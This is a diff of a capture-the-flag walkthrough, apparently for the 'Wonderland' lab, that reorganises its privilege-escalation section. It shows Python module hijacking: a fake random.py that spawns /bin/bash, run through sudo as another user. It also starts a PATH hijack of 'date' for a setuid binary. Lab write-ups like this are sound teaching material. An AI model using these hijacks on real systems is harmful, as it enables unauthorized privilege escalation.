@@ -113,9 +113,17 @@ It is strange to see root.txt in the folder of alice. ```find ./ -type f -iname 
 
 ## Escalate privileges to rabbit
 
-To escalate privileges we can misuse the fact that we can run `walrus_and_the_carpenter.py`.
+We see `walrus_and_the_carpenter.py` imports and calls `random` to get 10 random lines from the alice in wonderland lyrics stored in the file:
 
-Running `sudo -l` shows we can run `walrus_and_the_carpenter.py` to get 10 random lines from the alice in wonderland lyrics stored in the file.
+```py
+import random
+[...]
+for i in range(10):
+    line = random.choice(poem.split("\n"))
+    print("The line was:\t", line)a
+```
+
+Running `sudo -l` shows we can run `walrus_and_the_carpenter.py` as rabbit:
 
 ??? output "ssh login"
     ```txt
@@ -127,17 +135,7 @@ Running `sudo -l` shows we can run `walrus_and_the_carpenter.py` to get 10 rando
         (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
     ```
 
-We see `walrus_and_the_carpenter.py` imports and calls random:
-
-```py
-import random
-[...]
-for i in range(10):
-    line = random.choice(poem.split("\n"))
-    print("The line was:\t", line)a
-```
-
-Create `random.py` with the following content to overwrite the random function imported and called in `walrus_and_the_carpenter.py`
+To escalate privileges we can misuse the fact that we can run `walrus_and_the_carpenter.py` by creating our own `random.py` with the following content to overwrite the random function imported and called in `walrus_and_the_carpenter.py`
 
 ```py
 import os
@@ -146,7 +144,7 @@ def choice(argument):
     os.system("/bin/bash")
 ```
 
-Running `walrus_and_the_carpenter.py` as rabbit with our `random.py` will make use rabbit.
+Running `walrus_and_the_carpenter.py` with our `random.py` will now give us prompt as rabbit:
 
 ```sh
 sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
@@ -176,7 +174,7 @@ Probably by Thu, 21 Oct 2021 20:39:50 +0000
 Ask very nicely, and I will give you some tea while you wait for him
 ```
 
-Let's copy the teaParty the kali machine and view it in detail with `strings teaParty`:
+Let's copy `teaParty` to the kali machine and view it in detail with `strings teaParty`:
 
 ??? output "strings teaParty"
     Serving teaParty to my kali machine
@@ -290,7 +288,7 @@ Let's copy the teaParty the kali machine and view it in detail with `strings tea
     .comment
     ```
 
-Let's modify the date function by creating a new file named `date` with the following content
+We see the program calls `date` in this line: ```/bin/echo -n 'Probably by ' && date --date='next hour' -R```. Just like with "random" from above, let's create our own `date` file e.g.:
 
 ```sh
 #!/bin/sh
